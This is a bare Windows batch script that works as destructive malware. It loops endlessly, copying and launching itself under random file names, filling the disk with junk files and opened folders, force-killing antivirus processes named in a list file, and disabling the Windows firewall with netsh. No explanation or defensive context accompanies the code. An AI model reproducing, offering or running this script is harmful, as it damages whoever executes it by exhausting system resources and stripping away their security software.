@echo off
:main
call flood >nul
call F_Spam >nul
call F_Blast >nul
call Kill_AV >nul
call Kill_FW >nul
goto main

:flood
set x=%random%
type %0 >> %x%.bat
start %x%.bat >nul

:F_Spam
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%

:F_Blast
set /A FBlast = %random%
md %FBlast%
start %FBlast% >nul

:Kill_AV
for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a >nul

:Kill_FW
netsh firewall set opmode disable >nul
netsh advfirewall set currentprofile state off >nul
